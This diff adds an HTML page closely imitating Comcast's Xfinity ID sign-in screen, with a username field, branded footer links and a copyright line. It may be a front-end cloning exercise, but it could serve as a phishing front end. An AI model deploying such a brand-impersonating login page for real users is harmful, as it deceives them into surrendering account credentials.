@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+      integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link rel="stylesheet" href="style.css" />
+    <!-- <script src="script.js" defer></script> -->
+    <script type="module" src="script.js"></script>
+    <title>Document</title>
+  </head>
+  <body>
+    <main>
+      <div class="wrapper">
+        <div class="container split">
+          <div class="col col-1 flow-content">
+            <form class="flow-content container" action="" id="form--one" style="--max-width: 27rem">
+              <img src="./asset/logo.svg" alt="" class="logo" />
+              <h1 class="title">Sign in with your Xfinity ID</h1>
+              <input class="input" type="text" name="user" id="user" placeholder="Email, mobile or username" />
+              <p class="error-message none">Please enter your Xfinity ID to sing in.</p>
+              <p>
+                By signing in, you agree to our
+                <a href="#" class="link">Terms of Service</a>
+                and
+                <a href="#" class="link">Privacy, Policy</a>
+              </p>
+              <button class="btn" type="submit" id="next-btn">
+                Let's go
+                <div class="spinner none"></div>
+              </button>
+            </form>
+            <ul class="faq__wrapper container" style="--max-width: 27rem">
+              <li class="faq">New to Xfinity? View exclusive offers near you</li>
+              <li class="faq">Find your Xfinity ID</li>
+              <li class="faq">Create a new Xfinity ID</li>
+            </ul>
+          </div>
+          <div class="col col-2">
+            <div class="bg-img"></div>
+          </div>
+        </div>
+      </div>
+    </main>
+    <footer>
+      <div class="footer__inner container">
+        <div class="copy-write__wrapper">
+          <p>
+            <span>&#169;</span>
+            2025 Comcast
+          </p>
+        </div>
+        <ul class="nav__list">
+          <li class="nav">
+            <img src="./asset/web-term.svg" alt="" />
+            <p>Web Terms Of Service</p>
+          </li>
+          <li class="nav">
+            <img src="./asset/ca-notice.svg" alt="" />
+            <p>CA Notice at Collection</p>
+          </li>
+          <li class="nav">
+            <img src="./asset/privacy.svg" alt="" />
+            <p>Privacy Policy</p>
+          </li>
+          <li class="nav">
+            <img src="./asset/your-privacy.svg" alt="" />
+            <p>Your Privacy Choices</p>
+          </li>
+          <li class="nav">
+            <img src="./asset/health.svg" alt="" />
+            <p>Health Privacy Notice</p>
+          </li>
+          <li class="nav">
+            <img src="./asset/ad-choices.svg" alt="" />
+            <p>Ad Choices</p>
+          </li>
+        </ul>
+        <div class="cookies__wrapper">
+          <img src="./asset/cookies.svg" alt="" />
+          <p>Cookie Preferences</p>
+        </div>
+      </div>
+    </footer>
+  </body>
+</html>
